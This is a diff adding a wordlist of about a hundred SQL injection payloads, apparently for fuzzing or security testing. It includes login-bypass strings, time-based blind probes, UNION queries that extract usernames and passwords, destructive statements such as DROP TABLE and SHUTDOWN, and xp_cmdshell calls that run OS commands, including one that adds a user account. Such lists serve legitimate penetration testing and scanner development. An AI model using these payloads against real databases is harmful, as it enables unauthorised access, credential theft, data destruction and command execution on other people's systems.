@@ -1,0 +1,104 @@
+1'1
+1' OR '1'='1
+1' OR '1'='1' --
+1' OR 2 > 1 --
+1' WAITFOR DELAY '0:0:5' --
+admin' --
+admin' OR '1'='1
+'; ALTER TABLE users ADD admin BOOLEAN; --
+AND '1'='1'#
+AND '1'='1'(
+AND '1'='1')
+AND '1'='1'--
+AND '1'='1'/*
+AND '1'='1';
+AND 1=1#
+AND 1=1(
+AND 1=1)
+AND 1=1--
+AND 1=1/*
+AND 1=1;
+AND '2'='2'
+AND '2'='2'--
+AND 2=2
+AND 2=2--
+AND 'x'='x'#
+AND 'x'='x'(
+AND 'x'='x')
+AND 'x'='x'--
+AND 'x'='x'/*
+AND 'x'='x';
+AND 'y'='y'--
+AND y=y
+'; BACKUP DATABASE AdventureWorks TO DISK = 'C:\backup.bak'; --
+'; BEGIN TRANSACTION; --
+'; DECLARE @s VARCHAR(4000); SET @s=CAST(0xDEC0DE AS VARCHAR(4000)); EXEC(@s); --
+'; DROP TABLE users; --
+'; DROP TABLE users; SELECT 'Injection successful' --
+'; EXECUTE('DROP TABLE users') --
+'; EXECUTE IMMEDIATE 'DROP TABLE users'; --
+'; EXEC xp_cmdshell('net user') --
+'; EXEC xp_cmdshell('net user test testpass /ADD') --
+'; IF (1=1) WAITFOR DELAY '00:00:05' --
+'; KILL CONNECTION_ID(); --
+" OR ""="
+' OR ''='
+' OR 1 --
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+' OR '1'='1' {
+' OR '1'='1'; --
+' OR 1=1 --
+' OR 1=1#
+' OR 1=1/*
+' OR 1=1; --
+' OR 1=1;--
+OR '1'='1'#
+OR '1'='1'(
+OR '1'='1')
+OR '1'='1'--
+OR '1'='1'/*
+OR '1'='1';
+OR 1=1
+OR 1=1#
+OR 1=1(
+OR 1=1)
+OR 1=1--
+OR 1=1/*
+OR 1=1;
+' OR 1=1 FETCH FIRST ROW ONLY; --
+' OR 1=1 LIMIT 1; --
+OR '2'='2'
+OR '2'='2'#
+OR '2'='2'--
+OR 2=2
+OR 2=2#
+OR 2=2--
+' OR 'a'='a
+' OR EXISTS(SELECT * FROM users)
+' OR NULL IS NULL; --
+' OR 'text'='t'+'ext
+' OR TRUE --
+' OR username IS NOT NULL OR username = '
+' OR username LIKE 'a%
+' OR 'x'='x
+OR 'x'='x'#
+OR 'x'='x'(
+OR 'x'='x')
+OR 'x'='x'--
+OR 'x'='x'/*
+OR 'x'='x';
+' OR 'x'='x'; DROP TABLE users; --
+OR 'y'='y
+OR 'y'='y'#
+OR 'y'='y'--
+OR y=y
+'; SELECT * FROM INFORMATION_SCHEMA.TABLES; --
+'; SHUTDOWN; --
+' UNION ALL SELECT NULL, username || ' ' || password FROM users; --
+UNION SELECT 1,2,3,4
+' UNION SELECT 1, 'admin', 'password' --
+UNION SELECT ALL NULL
+' UNION SELECT ALL username, password FROM users WHERE 'x' = 'x
+'; WAITFOR DELAY '0:0:5' --
